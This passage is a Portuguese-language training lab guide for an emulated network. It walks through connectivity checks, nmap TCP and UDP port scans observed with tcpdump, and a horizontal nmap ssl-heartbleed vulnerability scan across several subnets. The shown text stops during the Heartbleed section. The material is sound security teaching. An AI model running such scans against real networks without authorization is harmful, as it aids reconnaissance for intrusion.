# Roteiro de Laboratório - Execução, detecção e contenção de ataques de varredura de portas, brute-force e negação de serviço

Neste laboratório vamos simular um cenário típico de ataques de varredura de portas (scan), ataques para quebra do mecanismo de autenticação (brute-force) e ataques de negação de serviço simples (DoS). Os ataques ocorrerão em um topologia conforme ilustrado na figura abaixo:

![Topology](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/topology.png)

## Atividade 1 - Acesso aos nós e teste de conectividade

Após a criação do laboratório, você terá a disposição um servidor do tipo container virtual no Kubernetes (chamados de Pod): o Mininet-Sec. O Mininet-Sec é um emulador de redes responsável pela criação da topologia apresentada na figura anterior. Naquela topologia, parte dos nós são *namespaces de rede do Linux*, outros são switches virtuais do tipo OpenVSwitch e Linux Bridge, e dois deles são também Pods no Kubernetes. Nesta atividade, vamos testar o acesso aos recursos criados para o lab e testar a conectividade entre eles.

Clique no link do Serviço "http-mininet-sec" conforme ilustrado abaixo para abrir a interface web do Mininet-Sec:

![Abrir Mininet-Sec](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/abrir-mininet-sec.png)

Após clicar no serviço Mininet-Sec, uma nova aba do seu navegador web deve ser aberta com a interface web do Mininet-Sec. Caso o Mininet-Sec ainda esteja criando a topologia, você verá uma mensagem informando para aguardar alguns segundos até que a topologia seja criada. Após finalizar a criação da topologia, você verá uma imagem como ilustrado abaixo:

![Tela inicial Mininet-Sec](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/tela-mininet-sec.png)

Na tela do Mininet-Sec, localize o host **h301** (host 3 do AS 300), clique neste host (ele deve mudar de cor para azul) e com o botão direito do mouse escolha a opção "Terminal". O terminal do host h301 deve ser aberto em uma nova aba do seu navegador web. Abaixo ilustramos esse processo:

![Abrir terminal do host h301](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/mnsec-terminal-h301.gif)

Após visualizar o terminal do h301, o próximo passo é testar a conectividade com o host srv501 (servidor 1 do AS 500). Para isso, devem ser executados comandos os quais utilizam as ferramentas ping e traceroute. A primeira é utilizada para verificar se um host está ativo, através do envio de pacotes do tipo *ICMP Echo Request* para um determinado destino, que pode responder com pacotes do tipo *ICMP Echo Reply*, se for possível fazer o envio de pacotes para ele. Dessa forma, o comando ping tem como saída informações sobre a conectividade, como a disponibilidade do host de destino e tempo percorrido até receber a resposta, por exemplo.

O traceroute, por outro lado, é uma ferramenta utilizada para verificar o caminho até um destino, de modo que o resultado do comando são os endereços IP dos hosts intermediários entre a origem e o destino. Para identificar os hosts intermediários, o roteador envia pacotes do tipo *ICMP Echo Request* com valores de TTL (ou seja, saltos máximos na rede) que aumentam gradualmente, de forma que, quando o TTL zera, o roteador recebe informações sobre o host intermediário que recebeu o pacote, de forma que consegue construir o caminho até o destino

É importante ressaltar que alguns hosts podem ser configurados para não responderem a comandos desse tipo, por questões de segurança, de modo que a falta de respostas não significa necessariamente que o host está inativo. 

Nesse sentido, para testar a conectividade, execute os seguintes comandos:

```
ping -c 4 172.16.50.1
```
```
traceroute -n 172.16.50.1
```

A seguinte saída é esperada para os comandos acima:
```
root@h301:~# ping -c 4 172.16.50.1
PING 172.16.50.1 (172.16.50.1) 56(84) bytes of data.
64 bytes from 172.16.50.1: icmp_seq=1 ttl=61 time=0.395 ms
64 bytes from 172.16.50.1: icmp_seq=2 ttl=61 time=0.152 ms
64 bytes from 172.16.50.1: icmp_seq=3 ttl=61 time=0.169 ms
64 bytes from 172.16.50.1: icmp_seq=4 ttl=61 time=0.166 ms

--- 172.16.50.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3051ms
rtt min/avg/max/mdev = 0.152/0.220/0.395/0.100 ms

root@h301:~# traceroute -n 172.16.50.1
traceroute to 172.16.50.1 (172.16.50.1), 30 hops max, 60 byte packets
 1  192.168.30.254  0.112 ms  0.029 ms  0.026 ms
 2  10.30.0.1  0.064 ms  0.034 ms  0.033 ms
 3  10.30.50.2  0.069 ms  0.049 ms  0.045 ms
 4  172.16.50.1  0.095 ms  0.061 ms  0.059 ms
```

Agora vamos realizar um novo teste de conectividade, desta vez a partir do host **secflood**. O host secflood possui conexões no AS 200 e no AS 400, porém o roteamento deste nós foi configurado para que a saída de Internet ocorra através do AS 200. Ou seja, quando o secflood envia pacotes para destinos quaisquer da topologia, por exemplo, um host no AS300, o pacote será enviado através da sua conexão no AS200. Execute os passos anteriores para abrir o Terminal mas desta vez do "secflood". Ao acesso o terminal do secflood execute o teste de ping para o srv501:
```
ping -c 4 172.16.50.1
```

Observe que desta vez a saída indica que o host está inalcançável:
```
root@mnsec-secflood1-14bbabbf330b44:/# ping -c 4 172.16.50.1
PING 172.16.50.1 (172.16.50.1) 56(84) bytes of data.
From 192.168.20.10 icmp_seq=1 Destination Host Unreachable
From 192.168.20.10 icmp_seq=2 Destination Host Unreachable

--- 172.16.50.1 ping statistics ---
4 packets transmitted, 0 received, +2 errors, 100% packet loss, time 3067ms
pipe 4
```

Repita o teste acima, porém agora utilizando como destino o IP do firewall **fw201** que é o gateway do secflood:
```
ping -c4 192.168.20.254
```

Novamente a saída indica que o firewall está inalcançável:
```
root@mnsec-secflood1-14bbabbf330b44:/# ping -c4 192.168.20.254
PING 192.168.20.254 (192.168.20.254) 56(84) bytes of data.
From 192.168.20.10 icmp_seq=1 Destination Host Unreachable
From 192.168.20.10 icmp_seq=2 Destination Host Unreachable
From 192.168.20.10 icmp_seq=3 Destination Host Unreachable
From 192.168.20.10 icmp_seq=4 Destination Host Unreachable

--- 192.168.20.254 ping statistics ---
4 packets transmitted, 0 received, +4 errors, 100% packet loss, time 3059ms
pipe 4
```

O comportamento acima é esperado e se dá pelo fato de que o AS200 ainda não foi configurado para prover conectividade entre os nós. O AS 200 possui switches programáveis e uma rede SDN (Rede Definida por Software), cujo controlador é o Kytos (leia mais sobre o Kytos em https://github.com/kytos-ng/). Vamos, portanto, configurar o Kytos para estabelecer a conectividade no AS 200, através da criação de um circuito virtual de VPN L2 (também chamado de EVC, _Ethernet Virtual Circuit_) que irá permitir a troca de pacotes entre interfaces de hosts de grupos distintos.

Para isso, vamos abrir o terminal do Kytos através do Mininet-Sec:

![Abrir Kytos](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/abrir-kytos.png)

No terminal do Kytos, vamos utilizar o comando curl para enviar requisições para a API REST do Kytos para criar uma VPN L2 que interconecta o secflood ao firewall fw201. Para isso, será utilizado um comando que cria um circuito o qual permite a troca de pacotes entre as interfaces eth1 do switch s203 (a qual possui o id 00:00:00:00:00:00:00:cb:1) e a interface eth2 do switch s201 (a qual possui o id 00:00:00:00:00:00:00:c9:2), permitindo que o secflood se conecte ao firewall e, consequentemente, tenha uma saída de internet pelo AS200. Nesse sentido, na aba com o terminal do Kytos, execute o seguinte comando:
```
curl -s -H 'Content-type: application/json' -X POST http://127.0.0.1:8181/api/kytos/mef_eline/v2/evc/ -d '{"name": "l2vpn-secflood-to-fw", "dynamic_backup_path": true, "uni_z": {"interface_id": "00:00:00:00:00:00:00:cb:1", "tag": {"tag_type": "vlan", "value": "untagged"}}, "uni_a": {"interface_id": "00:00:00:00:00:00:00:c9:2", "tag": {"tag_type": "vlan", "value": "untagged"}}}' | jq
```

A saída esperada do comando acima mostra o id do circuito criado e o status de que o mesmo está ativo:
```
root@kytos-14bbabbf330b44-75854d5cf8-94j6b:/# curl -s -H 'Content-type: application/json' -X POST http://127.0.0.1:8181/api/kytos/mef_eline/v2/evc/ -d '{"name": "l2vpn-secflood-to-fw", "dynamic_backup_path": true, "uni_z": {"interface_id": "00:00:00:00:00:00:00:cb:1", "tag": {"tag_type": "vlan", "value": "untagged"}}, "uni_a": {"interface_id": "00:00:00:00:00:00:00:c9:2", "tag": {"tag_type": "vlan", "value": "untagged"}}}' | jq
{
  "circuit_id": "348a7bc54f1745",
  "deployed": true
}
root@kytos-14bbabbf330b44-75854d5cf8-94j6b:/# 
```

Agora vamos voltar ao terminal do secflood e realizar novamente os testes de ping:
```
ping -c 4 172.16.50.1
```
```
ping -c 4 192.168.20.254
```

O comportamento esperado agora indica o sucesso na conectividade do secflood, conforme ilustrado abaixo nos testes entre o secflood e o fw201 e entre o secflood e srv501:

```
root@mnsec-secflood1-14bbabbf330b44:/# ping -c 4 192.168.20.254
PING 192.168.20.254 (192.168.20.254) 56(84) bytes of data.
64 bytes from 192.168.20.254: icmp_seq=1 ttl=64 time=3.35 ms
64 bytes from 192.168.20.254: icmp_seq=2 ttl=64 time=3.35 ms
64 bytes from 192.168.20.254: icmp_seq=3 ttl=64 time=3.38 ms
64 bytes from 192.168.20.254: icmp_seq=4 ttl=64 time=3.35 ms

--- 192.168.20.254 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 3.345/3.357/3.382/0.014 ms

root@mnsec-secflood1-14bbabbf330b44:/# ping -c 4 172.16.50.1
PING 172.16.50.1 (172.16.50.1) 56(84) bytes of data.
64 bytes from 172.16.50.1: icmp_seq=1 ttl=58 time=3.55 ms
64 bytes from 172.16.50.1: icmp_seq=2 ttl=58 time=3.54 ms
64 bytes from 172.16.50.1: icmp_seq=3 ttl=58 time=3.46 ms
64 bytes from 172.16.50.1: icmp_seq=4 ttl=58 time=3.44 ms

--- 172.16.50.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 3.444/3.497/3.546/0.044 ms
```

## Atividade 2 - Ataques de varredura de porta

Os ataques de varredura de porta, também conhecidos como *port scanning*, visam levantar informações sobre um ambiente alvo, incluindo os computadores que estão online, serviços de rede em execução no computador (i.e, portas abertas) e informações sobre o software que está recebendo pacotes em determinada porta. A varredura de portas faz parte da fase de reconhecimento de rede e levantamento de informações em um ataque ou exercício de auditoria (exercício de auditoria aqui refere-se a uma ação/ataque coordenada e autorizada o qual pode ser realizado em uma organização com o objetivo de avaliar a eficácia dos sistemas de segurança cibernética aplicados). Nesta atividade vamos explorar alguns cenários de varredura de porta utilizando a ferramenta **nmap**.

### 2.1 Executando nmap através da interface web do secflood

Na interface web do Dashboard, clique no link do Serviço "https-secflood" conforme ilustrado abaixo para abrir a interface web do Secflood:

![Abrir Secflood](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/abrir-secflood.png)

Ao clicar no link do serviço, você deve receber um alerta sobre o certificado SSL auto-assinado. Neste ambiente restrito de teste, é seguro ignorar o alerta e prosseguir:

![Erro SSL](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/erro-ssl.png)


Você será direcionado ao portal web do secflood, que provê uma interface de usuário para facilitar a utilização das ferramentas de segurança. A tela inicial do Secflood irá solicitar usuário e senha, conforme mostrado abaixo (você pode fornecer os valores hostname = `127.0.0.1`, usuário = `root` e senha = `hackinsdn`)

![Login Secflood](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/secflood-login.png)

Após logar no Secflood, navegue pelo menu à esquerda e clique em "Tools List" e então escolha a ferramenta "nmap".

Na tela de utilização do NMAP existem várias opções que podem ser exploradas. A figura abaixo ilustra algumas destas opções. Você pode clicar no botão "Commands" (número 1 na figura) pra visualizar as opções disponíveis e sintaxe da ferramenta. No botão "+ Options" (número 2 na figura) você pode de fato habilitar parâmetros que customizam o funcionamento do nmap. Por fim, o alvo da varredura de portas pode ser especificado no campo de entrada principal (número 3 na figura). Preencha o alvo do ataque como sendo o IP do srv101 cujo valor deve ser **172.16.10.1** (número 3 na figura, sinalizado com a seta) e então clique em "Execute" (número 4 na figura, também sinalizado com a seta):

![Secflood NMAP](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/secflood-nmap.png)

Após executar o teste de NMAP acima, você deverá obter o seguinte resultado:

![Secflood NMAP Resultado](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/secflood-nmap-result.png)

Este resultado acima mostra que o SCAN obteve resultados interessantes para o reconhecimento do ambiente, listando duas portas TCP abertas: 80 e 443. O Secflood pode ajudar no processo de eventuais correções para portas indevidamente abertas, bem como é possível salvar o relatório para futura análise.

### 2.2 Executando nmap através da linha de comando

Na execução anterior, foi possível observar que o nmap executado a partir do secflood e tendo como alvo o srv101 retornou apenas duas portas TCP abertas, 80 e 443. Vamos repetir o testes a partir da CLI do host h101 e comparar os resultados.

Antes de iniciar o ataque propriamente dito, abra o terminal do alvo da varredura -- o host srv101 -- na visualização do Mininet-Sec:

![Abrir srv101](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/abrir-srv101.png)

Ainda na visualização da topologia no Mininet-Sec, escolha o host h101 e abra também o terminal dele.

![Abrir h101](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/abrir-h101.png)

Em seguida vamos utilizar uma ferramenta de *sniffing de rede*  para realizar a captura e visualização de pacotes na interface de rede. No terminal do srv101, inicie o tcpdump com o comando abaixo:
```
tcpdump -i srv101-eth0 -n
```

Você deveria observar a seguinte saída:
```
root@srv101:~# tcpdump -i srv101-eth0 -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on srv101-eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes

```

Observe que o terminal fica ocupado na execução do TCPDUMP. Nenhum pacote é exibido até então pois não há tráfego de rede direcionado ao servidor. Vamos realizar a varredura no h101 e checar novamente o srv101.

No terminal do h101, execute:
```
nmap 172.16.10.0/24
```

Você deve observar uma saída similar ao mostrado abaixo:
```
root@h101:~# nmap 172.16.10.0/24
Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-29 19:19 UTC
Nmap scan report for 172.16.10.1
Host is up (0.00072s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
443/tcp open  https

Nmap scan report for 172.16.10.2
Host is up (0.00071s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp

Nmap scan report for 172.16.10.3
Host is up (0.00012s latency).
All 1000 scanned ports on 172.16.10.3 are in ignored states.
Not shown: 1000 closed tcp ports (reset)

Nmap scan report for 172.16.10.254
Host is up (0.000057s latency).
All 1000 scanned ports on 172.16.10.254 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap done: 256 IP addresses (4 hosts up) scanned in 20.72 seconds
```

Note que, diferente da execução anterior, desta vez foi realizada uma varredura de toda a rede `172.16.10.0/24`. Além disso, se compararmos a saída apresentada para o host 172.16.10.1 nesta execução e na execução anterior, é possível observar que novas portas foram exibidas: 53/tcp (DNS) e 22/tcp (SSH).

> [!IMPORTANT]  
> Por que ocorre essa diferença entre as saídas quando realizada a partir do host secflood e do h101? Considerando a fase de reconhecimento de uma auditoria de segurança, ou mesmo o processo de levantamento de vulnerabilidades, quais as vantagens e desvantagens de ambas as execuções?
<textarea name="resposta_nmap_secflood_h101" rows="6" cols="80" placeholder="Escreva sua resposta aqui...">
</textarea>

Voltando ao terminal do srv101, digite CTRL+C a fim de parar a execução do tcpdump. Utilize a barra de rolagem do navegador web para visualizar a saída desde o início. Observe que parte da captura de tráfego contém requisições ARP feitas a partir do gateway para os demais IPs da rede 172.16.10.0/24:
```
root@srv101:~# tcpdump -i srv101-eth0 -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on srv101-eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
19:45:20.536840 IP 192.168.10.1 > 172.16.10.1: ICMP echo request, id 17118, seq 0, length 8
19:45:20.536883 IP 192.168.10.1 > 172.16.10.1: ICMP echo request, id 17118, seq 0, length 8
19:45:20.536912 IP 172.16.10.1 > 192.168.10.1: ICMP echo reply, id 17118, seq 0, length 8
19:45:20.536970 IP 192.168.10.1 > 172.16.10.2: ICMP echo request, id 42350, seq 0, length 8
19:45:20.537031 IP 192.168.10.1 > 172.16.10.3: ICMP echo request, id 55492, seq 0, length 8
19:45:20.537095 ARP, Request who-has 172.16.10.4 tell 172.16.10.254, length 28
19:45:20.537145 ARP, Request who-has 172.16.10.5 tell 172.16.10.254, length 28
19:45:20.537181 ARP, Request who-has 172.16.10.6 tell 172.16.10.254, length 28
19:45:20.537215 ARP, Request who-has 172.16.10.7 tell 172.16.10.254, length 28
19:45:20.537249 ARP, Request who-has 172.16.10.8 tell 172.16.10.254, length 28
19:45:20.537284 ARP, Request who-has 172.16.10.9 tell 172.16.10.254, length 28
19:45:20.537319 ARP, Request who-has 172.16.10.10 tell 172.16.10.254, length 28
...
```

Tal comportamento se dá devido a forma como a varredura de rede padrão do nmap ocorre: primeiro o nmap verifica os hosts que estão ativos (enviando os ICMP echo request) e em seguida faz a verificação de portas abertas. Você pode modificar esse comportamento utilizando a opção `-Pn` do nmap. De toda forma, ao continuar analisando a captura de pacotes, você vai observar os testes de portas abertas como mostrado abaixo:
```
19:45:37.520408 IP 192.168.10.1.37988 > 172.16.10.1.23: Flags [S], seq 1376385575, win 1024, options [mss 1460], length 0
19:45:37.520428 IP 172.16.10.1.23 > 192.168.10.1.37988: Flags [R.], seq 0, ack 1376385576, win 0, length 0
19:45:37.520647 IP 192.168.10.1.37988 > 172.16.10.1.110: Flags [S], seq 1376385575, win 1024, options [mss 1460], length 0
19:45:37.520656 IP 172.16.10.1.110 > 192.168.10.1.37988: Flags [R.], seq 0, ack 1376385576, win 0, length 0
19:45:37.523295 IP 192.168.10.1.37988 > 172.16.10.1.143: Flags [S], seq 1376385575, win 1024, options [mss 1460], length 0
19:45:37.523308 IP 172.16.10.1.143 > 192.168.10.1.37988: Flags [R.], seq 0, ack 1376385576, win 0, length 0
19:45:37.523487 IP 192.168.10.1.37988 > 172.16.10.1.443: Flags [S], seq 1376385575, win 1024, options [mss 1460], length 0
19:45:37.523504 IP 172.16.10.1.443 > 192.168.10.1.37988: Flags [S.], seq 1374860696, ack 1376385576, win 64240, options [mss 1460], length 0
19:45:37.523543 IP 192.168.10.1.37988 > 172.16.10.1.443: Flags [R], seq 1376385576, win 0, length 0
```

Observe que os pacotes seguem uma sequencia lógica: o host que executa o nmap (192.168.10.1) envia um pacote TCP-SYN na porta de interesse (observe, inclusive, que por padrão o NMAP começa com as portas mais comuns 23, 110, 143, 443, etc. uma estratégia mais eficiente que fazer o levantamento sequencial), caso a porta não esteja aberta no host alvo (172.16.10.1 na saída acima) uma resposta TCP-RST (reset) é enviada. Este é o conhecido processo **three-way handshake** do TCP, porém ao invés de o cliente confirmar a abertura de conexão com o ACK final, ele envia o reset (RST). Isso ocorre para a porta 23, então 110, 143, mas o comportamento muda na porta 443. Para a porta 443 (https), o host srv101 responde com TCP-SYN-ACK `S.` e então o host que executa o scan envia o TCP-RST (reset). Esse comportamento é um indicativo de que a porta está aberta. Saiba que o nmap possui outros tipos de varredura (exemplo: Connect/ACK/Window/Maimon scans/TCP Null/FIN/Xmas), mas não as abordaremos neste laboratório.

### 2.3 Varredura UDP

Como mencionamos na atividade anterior, o scan padrão do nmap para TCP vale-se do processo **three-way handshake**. Para varreduras com UDP, entretanto, este processo ocorre de forma ligeiramente diferente. Nesta atividade vamos analisar a varredura UDP.

Para verificar como a varredura UDP ocorre na perspectiva da rede, vamos iniciar o TCPDUMP no host *fw101* e posteriormente analisar a captura de tráfego. Para isso, no terminal do host fw101 execute o seguinte comando:
```
tcpdump -i fw101-eth2 -n
```

De volta a interface web do Secflood, execute um scan UDP tendo como alvo novamente o IP 172.16.10.1, porém desta vez clique no botão *+ Options* e escolha a opção *Scan common UDP ports*. Por fim, clique em *Execute* para iniciar o scan. 

![Secflood UDP scan](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/secflood-udp-scan.png)

A saída esperada para a varredura executada é semelhante ao apresentado abaixo:
```
Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-30 08:28 UTC
Nmap scan report for 172.16.10.1
Host is up (0.00048s latency).

PORT     STATE         SERVICE
53/udp   open          domain
68/udp   filtered      dhcpc
69/udp   filtered      tftp
123/udp  open|filtered ntp
138/udp  filtered      netbios-dgm
161/udp  filtered      snmp
162/udp  filtered      snmptrap
500/udp  closed        isakmp
4500/udp filtered      nat-t-ike
5600/udp filtered      esmmanager

Nmap done: 1 IP address (1 host up) scanned in 16.67 seconds
```

Observe que, no geral, as portas retornam com valor "filtered", porém uma porta retornou "open", outra porta retornou "open|filtered" e por fim uma terceira porta retornou "closed". Volte ao terminal do host fw101, tecle CTRL+C para parar a captura e observe a captura de pacotes, conforme ilustrado abaixo (OBS: alguns pacotes foram omitidos e outros reordenados para simplificar a saída e facilitar o entendimento):
```
root@fw101:~# tcpdump -i fw101-eth2 -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on fw101-eth2, link-type EN10MB (Ethernet), snapshot length 262144 bytes
...
08:31:20.728384 IP 192.168.20.10.59325 > 172.16.10.1.53: 0 stat [0q] (12)
08:31:20.728487 IP 192.168.20.10.59325 > 172.16.10.1.53: 30583+ TXT CHAOS? version.bind. (30)
08:31:20.729128 IP 172.16.10.1.53 > 192.168.20.10.59325: 0 stat [b2&3=0x1005] [0q] (12)
08:31:20.729267 IP 192.168.20.10 > 172.16.10.1: ICMP 192.168.20.10 udp port 59325 unreachable, length 48

08:31:20.728603 IP 192.168.20.10.59325 > 172.16.10.1.162:  [nothing to parse]
08:31:20.728638 IP 10.10.0.254 > 192.168.20.10: ICMP 172.16.10.1 udp port 162 unreachable, length 36

08:31:20.728915 IP 192.168.20.10.59325 > 172.16.10.1.138: UDP, length 0
08:31:20.728933 IP 10.10.0.254 > 192.168.20.10: ICMP 172.16.10.1 udp port 138 unreachable, length 36

08:31:20.729042 IP 192.168.20.10.59325 > 172.16.10.1.4500: UDP-encap: ESP(spi=0x3127fcb0,seq=0x38109e89), length 204
08:31:20.729054 IP 10.10.0.254 > 192.168.20.10: ICMP 172.16.10.1 udp port 4500 unreachable, length 240

08:31:20.729143 IP 192.168.20.10.59325 > 172.16.10.1.5600: UDP, length 0
08:31:20.729155 IP 10.10.0.254 > 192.168.20.10: ICMP 172.16.10.1 udp port 5600 unreachable, length 36

08:31:20.729349 IP 192.168.20.10.59325 > 172.16.10.1.500: isakmp: phase 1 I ident
08:31:20.729391 IP 172.16.10.1 > 192.168.20.10: ICMP 172.16.10.1 udp port 500 unreachable, length 228
08:31:20.729471 IP 192.168.20.10.59325 > 172.16.10.1.500: isakmp: phase 1 I ident
08:31:20.729498 IP 172.16.10.1 > 192.168.20.10: ICMP 172.16.10.1 udp port 500 unreachable, length 240

08:31:20.729586 IP 192.168.20.10.59325 > 172.16.10.1.123: NTPv4, Client, length 48
08:31:20.729632 IP 192.168.20.10.59325 > 172.16.10.1.123: NTPv3, symmetric active, length 48

08:31:20.729683 IP 192.168.20.10.59325 > 172.16.10.1.161:  F=r U="" E= C="" GetRequest(12) 
08:31:20.729695 IP 10.10.0.254 > 192.168.20.10: ICMP 172.16.10.1 udp port 161 unreachable, length 96
08:31:20.729772 IP 192.168.20.10.59325 > 172.16.10.1.161:  GetNextRequest(18)  .0.0
08:31:20.729783 IP 10.10.0.254 > 192.168.20.10: ICMP 172.16.10.1 udp port 161 unreachable, length 69

08:31:20.729867 IP 192.168.20.10.59325 > 172.16.10.1.69: TFTP, length 12, tftp-#0
08:31:20.729915 IP 192.168.20.10.59325 > 172.16.10.1.69: TFTP, length 19, RRQ "r7tftp.txt" octet

08:31:20.729973 IP 192.168.20.10.59325 > 172.16.10.1.68:  [|bootp]
08:31:21.830087 IP 192.168.20.10.59327 > 172.16.10.1.68:  [|bootp]
08:31:21.830123 IP 10.10.0.254 > 192.168.20.10: ICMP 172.16.10.1 udp port 68 unreachable, length 36

08:31:21.830232 IP 192.168.20.10.59327 > 172.16.10.1.69: TFTP, length 12, tftp-#0
08:31:21.830273 IP 192.168.20.10.59327 > 172.16.10.1.69: TFTP, length 19, RRQ "r7tftp.txt" octet

08:31:21.830322 IP 192.168.20.10.59327 > 172.16.10.1.123: NTPv4, Client, length 48
08:31:21.830358 IP 192.168.20.10.59327 > 172.16.10.1.123: NTPv3, symmetric active, length 48
08:31:22.931596 IP 192.168.20.10.59329 > 172.16.10.1.123: NTPv4, Client, length 48
08:31:22.931669 IP 192.168.20.10.59329 > 172.16.10.1.123: NTPv3, symmetric active, length 48

08:31:22.931732 IP 192.168.20.10.59329 > 172.16.10.1.69: TFTP, length 12, tftp-#0
08:31:22.931757 IP 10.10.0.254 > 192.168.20.10: ICMP 172.16.10.1 udp port 69 unreachable, length 48
08:31:22.931867 IP 192.168.20.10.59329 > 172.16.10.1.69: TFTP, length 19, RRQ "r7tftp.txt" octet

08:31:24.032864 IP 192.168.20.10.59331 > 172.16.10.1.123: NTPv4, Client, length 48
08:31:24.032943 IP 192.168.20.10.59331 > 172.16.10.1.123: NTPv3, symmetric active, length 48
^C
59 packets captured
59 packets received by filter
0 packets dropped by kernel
```

> [!IMPORTANT]  
> A partir da análise da captura de pacotes acima, como explicar a estratégia usada pelo NMAP para identificar a porta como aberta? De acordo com a captura, por que o NMAP identifica a porta 123/udp como "aberta" ou "filtrada" ? Por que a porta 500/udp foi listada pelo NMAP como "closed", ao passo que a maioria das portas estava listada como "filtered"?
<textarea name="resposta_nmap_udp" rows="6" cols="80" placeholder="Escreva sua resposta aqui...">
</textarea>

Repita o scan com NMAP, porém agora marque também a opção **Service detection (Lighter)**. A varredura deve ser um pouco mais longa, pois agora o NMAP executará algumas checagens adicionais para tentar identificar o serviço. A saída esperada deve ser similar ao mostrado abaixo:
```
Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-30 08:49 UTC
Nmap scan report for 172.16.10.1
Host is up (0.00042s latency).

PORT     STATE         SERVICE     VERSION
53/udp   open          domain?
68/udp   filtered      dhcpc
69/udp   filtered      tftp
123/udp  open|filtered ntp
138/udp  filtered      netbios-dgm
161/udp  filtered      snmp
162/udp  filtered      snmptrap
500/udp  closed        isakmp
4500/udp filtered      nat-t-ike
5600/udp filtered      esmmanager
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-UDP:V=7.93%I=0%D=12/24%Time=676A759B%P=x86_64-pc-linux-gnu%r(DNS
SF:StatusRequest,C,"\0\0\x10\x05\0\0\0\0\0\0\0\0");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.11 seconds
```

Observe que a porta 123/udp continua listada como "open|filtered". Execute um scan agressivo com detecção de serviço direcionado para a porta 123/udp utilizando as seguintes opções:

![Secflood UDP scan agressivo](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/secflood-udp-scan-agressivo.png)

> [!IMPORTANT]  
> É possível afirmar com certeza o estado da porta? Podemos afirmar que muito provavelmente a porta está fechada?
<textarea name="resposta_nmap_estado_portas" rows="6" cols="80" placeholder="Escreva sua resposta aqui...">
</textarea>

### 2.4 Scan horizontal e Engine de scripts do NMAP

Nesta atividade vamos testar o scan do tipo horizontal, onde você varre múltiplos endereços IPs porém em uma porta ou conjunto de portas específico. Adicionalmente, é possível fazer uso da engine de scripts do NMAP, que contém checagens adicionais muito úteis para detecção de serviços, teste de vulnerabilidades, inventariado ou levantamento de informações adicionais do serviço, dentre outros. A combinação das duas técnicas pode ser interessante para identificar vulnerabilidades que atingem uma grande escala de dispositivos e podem ser exploradas pela rede. Um exemplo de tal cenário é a CVE-2014-0160 (https://nvd.nist.gov/vuln/detail/cve-2014-0160), popularmente conhecida como OpenSSL Heartbleed, uma vulnerabilidade de alto impacto identificada em 2014 que permitia ao atacante ler a memória do processo remoto em resposta a pacotes especificamente formatados. Tal vulnerabilidade ganhou um grau de proporção grande pois muitos softwares de diferentes fabricantes utilizavam de alguma maneira a biblioteca openssl em uma das versões afetadas, e portanto também foram afetados. Nesse cenário, o uso do scan horizontal em conjunto com NSE podem ser bastante úteis para levantamento da superfície da vulnerabilidade na instituição.

Abra o terminal do host *secflood* e execute o comando abaixo:
```
nmap -p T:443,25,465,587,143,110,993,995,8443 --script ssl-heartbleed 172.16.10.0/24 172.16.20.0/24 172.16.30.0/24 172.16.40.0/24 172.16.50.0/24
```

O comando acima irá varrer diversas redes e diversas portas - portas que potencialmente executam alguma aplicação que faz uso de SSL (exemplo: 443 que provavelmente executa HTTPS, ou ainda porta 587 que roda o cliente SMTP e pode fazer uso de SSL quando o cliente submete o comando STARTTLS) - checando pela vulnerabilidade SSL Heartbleed através do script `ssl-heartbleed.nse` (que por padrão fica localizado em /usr/share/nmap/scripts). A saída esperada é ilustrada abaixo (a execução será um pouco mais longa que o habitual devido a quantidade de hosts para escanear):
```
root@mnsec-secflood1-637b0d4f77fb4f:/# nmap -p T:443,25,465,587,143,110,993,995,8443 --script ssl-heartbleed 172.16.10.0/24 172.16.20.0/24 172.16.30.0/24 172.16.40.0/24 172.16.50.0/24
Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-30 09:22 UTC
...
Nmap scan report for 172.16.40.1
Host is up (0.00047s latency).

PORT     STATE  SERVICE
25/tcp   closed smtp
110/tcp  closed pop3
143/tcp  closed imap
443/tcp  open   https
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
